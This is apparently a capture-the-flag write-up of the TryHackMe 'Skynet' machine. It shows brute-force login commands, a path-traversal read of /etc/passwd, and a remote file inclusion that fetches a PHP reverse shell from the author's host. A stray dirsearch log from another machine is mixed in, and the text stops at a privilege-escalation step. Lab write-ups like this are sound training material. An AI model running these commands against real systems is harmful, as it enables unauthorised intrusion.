*A vulnerable Terminator themed Linux machine.*

This is [Skynet](https://tryhackme.com/room/skynet) from THM. It's easy rated, subscriber only and part of the 'Offensive Pentesting' learning path. I've decided to subscribe; I'll just try one month at this stage and see if I like it. 

## Ports
We've got a few ports:

PORT    STATE SERVICE
1. 22/tcp  open  ssh
2. 80/tcp  open  http
3. 110/tcp open  pop3
4. 139/tcp open  netbios-ssn
5. 143/tcp open  imap
6. 445/tcp open  microsoft-ds

## SMB
We can see there are a couple of shares; particularly *anonymous* and *milesdyson*. The *milesdyson* share requires credentials, whereas the *anonymous* one (duh) does not. In there we get a message about passwords needing to be changed, signed by *Miles Dyson*. There are also three 'log' files; two are empty and the other one contains what looks like a list of passwords.

## HTTP
The front page is a search box that doesn't appear to do anything, and we've got no *robots.txt*. 

Dirsearch finds a few things we don't have access to (particularly *admin* and *config*), but also something we do: *squirrelmail*. This is a webmail client with a login page.

>root@kali:/opt/tryhackme/battery# cat /opt/dirsearch/reports/battery.thm/_21-01-15_20-41-52.txt  
200   663B   http://battery.thm:80/admin.php  
302   908B   http://battery.thm:80/dashboard.php    -> REDIRECTS TO: admin.php  
200     2KB  http://battery.thm:80/forms.php  
200   406B   http://battery.thm:80/index.html  
302     0B   http://battery.thm:80/logout.php    -> REDIRECTS TO: admin.php  
200   715B   http://battery.thm:80/register.php  
200    17KB  http://battery.thm:80/report

200     2KB  http://battery.thm:80/scripts/  
403   292B   http://battery.thm:80/server-status/  

While searchsploit does have entries for squirrelmail, there are none for this version. So we need to break in.

### Hydra
I've used Hydra in the past to bruteforce login pages but it did have a little trouble with this. The error message given by the webapp for an incorrect login attempt was:

>ERROR  
Unknown user or password incorrect.  
Go to the login page  

After some trial and error, I found that Hydra responded correctly (i.e. correctly identified the user:pass combination) if the error message was *Unknown user or password incorrect* or some part thereof, but NOT if the error message was specified as *ERROR* or *Go to the login page*. So, for example:

``
hydra -l milesdyson -P log1.txt 10.10.158.183 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown"
``

This worked, but this (below) did not:

``
hydra -l milesdyson -P log1.txt 10.10.158.183 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=ERROR"
``

This is fairly unsatisfactory, since not finding anything is a completely valid result; but we can't tell if a null result is due to a problem parsing the page response OR if we don't have a valid credential combination. 

### Medusa
As an experiment, I tried Medusa instead to see if it behaved any better. But it didn't seem to work *at all*.

### Patator
After some more research I decided to try *patator*, about which the [creator says](https://github.com/lanjelot/patator): *Patator was written out of frustration from using Hydra, Medusa, Ncrack, Metasploit modules and Nmap NSE scripts for password guessing attacks.* 

Anyway, it seemed to work very well indeed and successfully grepped the response for the error messages like I would have thought Hydra should have, so it will now be my go to:

``
patator http_fuzz url=http://10.10.204.243/squirrelmail/src/redirect.php method=POST body='login_username=FILE0&secretkey=FILE1&js_autodetect_results=1&just_logged_in=1' 0=./username 1=./log1.txt accept_cookie=1 -x ignore:fgrep='ERROR'
``

### Webmail
The point of this exercise was to get us into Miles's webmail, where we found his SMB password. With that we can login to his share and retrieve some information:

{% highlight shell %}
root@kali:/opt/tryhackme/skynet# python3 /usr/share/doc/python3-impacket/examples/smbclient.py milesdyson:')s{A&2Z=F^n_E.B`'@10.10.204.243
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# use milesdyson
# get important.txt
root@kali:/opt/tryhackme/skynet# cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
{% endhighlight %}

So now we have a hidden directory to investigate.

## Hidden directory
In the hidden directory under the */administrator* subdirectory we find *Cuppa CMS*. There is a login page but checking searchsploit shows we don't need to login, since we have an unauthenticated LFI/RFI vulnerability:

``
http://10.10.204.243/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
``

I host the PentestMonkey PHP reverse shell on my box and use the RFI:

``
http://10.10.204.243/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.10.123/shell.php
``

{% highlight shell %}
root@kali:/opt/tryhackme/skynet# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.204.243 - - [22/Jan/2021 04:57:32] "GET /shell.php HTTP/1.0" 200 - 
{% endhighlight %}

And with a separate listener, we are on the box.

## Privesc
We are on as www-data but we can read the user flag from */home/milesdyson*. We can also *su* to miles with the password we found earlier for his webmail, but we don't need to. We have a root cronjob with a TAR wildcard to take [advantage of](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/):

{% highlight shell %}
